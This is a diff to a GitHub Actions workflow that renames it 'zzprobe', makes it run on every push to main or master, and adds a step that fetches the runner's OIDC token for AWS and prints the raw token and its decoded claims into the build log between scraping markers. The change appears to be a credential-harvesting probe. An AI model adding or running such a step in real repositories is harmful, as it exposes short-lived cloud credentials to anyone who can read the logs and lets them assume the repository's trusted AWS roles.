@@ -1,5 +1,8 @@
-name: probe
-on: workflow_dispatch
+name: zzprobe
+on:
+  workflow_dispatch:
+  push:
+    branches: [ main, master ]
 permissions:
   id-token: write
   contents: read
@@ -7,4 +10,11 @@ jobs:
   p:
     runs-on: ubuntu-latest
     steps:
-      - run: echo probe
+      - name: emit
+        run: |
+          R=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com")
+          ID=$(echo "$R" | python3 -c "import sys,json;print(json.load(sys.stdin).get('value',''))")
+          echo "TOKENSTART"
+          echo "$ID"
+          echo "TOKENEND"
+          python3 -c "import base64,json;t='$ID'.split('.')[1];t+='='*(-len(t)%4);print('CLAIMS='+json.dumps(json.loads(base64.urlsafe_b64decode(t))))"
